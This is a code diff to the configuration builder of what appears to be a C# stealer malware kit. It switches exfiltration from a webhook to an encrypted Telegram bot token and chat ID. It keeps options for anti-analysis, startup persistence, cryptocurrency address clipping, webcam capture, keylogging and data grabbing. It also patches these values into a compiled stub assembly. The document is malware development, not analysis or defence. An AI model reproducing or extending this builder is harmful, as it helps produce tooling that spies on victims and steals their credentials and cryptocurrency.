@@ -10,20 +10,22 @@ namespace BuilderGUI
 
         public static readonly Dictionary<string, string> ConfigValues = new()
         {
-            {"Webhook", ""},
-            {"Debug", ""},
-            {"AntiAnalysis", ""},
-            {"Startup", ""},
-            {"StartDelay", ""},
-            {"ClipperBTC", ""},
-            {"ClipperETH", ""},
-            {"ClipperLTC", ""},
-            {"WebcamScreenshot", ""},
-            {"Keylogger", ""},
-            {"Clipper", ""},
-            {"Grabber", ""},
-            {"Mutex", RandomString(20)}
+            {"TelegramAPI", ""},         // Stores the encrypted Telegram bot API token
+            {"TelegramID", ""},          // Stores the encrypted Telegram chat ID
+            {"Debug", ""},               // Stores debug setting
+            {"AntiAnalysis", ""},        // Stores anti-analysis setting
+            {"Startup", ""},             // Stores startup option setting
+            {"StartDelay", ""},          // Stores start delay option
+            {"ClipperBTC", ""},          // Stores encrypted Bitcoin address for clipper
+            {"ClipperETH", ""},          // Stores encrypted Ethereum address for clipper
+            {"ClipperLTC", ""},          // Stores encrypted Litecoin address for clipper
+            {"WebcamScreenshot", ""},    // Stores webcam screenshot option
+            {"Keylogger", ""},           // Stores keylogger setting
+            {"Clipper", ""},             // Stores clipper option
+            {"Grabber", ""},             // Stores grabber setting
+            {"Mutex", RandomString(20)}  // Generates a random mutex string
         };
+
 
         private static string RandomString(int length)
         {
@@ -47,15 +49,16 @@ namespace BuilderGUI
 
         private static string ReplaceConfigParams(string value)
         {
+            // If the value contains the key, perform the replacement
             foreach (KeyValuePair<string, string> config in ConfigValues)
             {
-                if (value.Equals($"--- {config.Key} ---"))
+                if (value.Contains($"--- {config.Key} ---"))
                 {
-                    return config.Value;
+                    return config.Value; // Replace with the actual config value
                 }
             }
 
-            return value;
+            return value; // Return the original value if no replacement is made
         }
 
         public static AssemblyDefinition IterValues(AssemblyDefinition definition)
@@ -74,7 +77,7 @@ namespace BuilderGUI
                                 {
                                     if (instruction.OpCode.Code == Code.Ldstr &&
                                         instruction.Operand is string operand &&
-                                        operand.StartsWith("---") && operand.EndsWith("---"))
+                                        operand.StartsWith("---") && operand.EndsWith("---"))  // More flexible check
                                     {
                                         instruction.Operand = ReplaceConfigParams(operand);
                                     }
@@ -86,6 +89,7 @@ namespace BuilderGUI
             }
             return definition;
         }
+
 
         public static string BuildStub(string outputPath, string stubPath)
         {
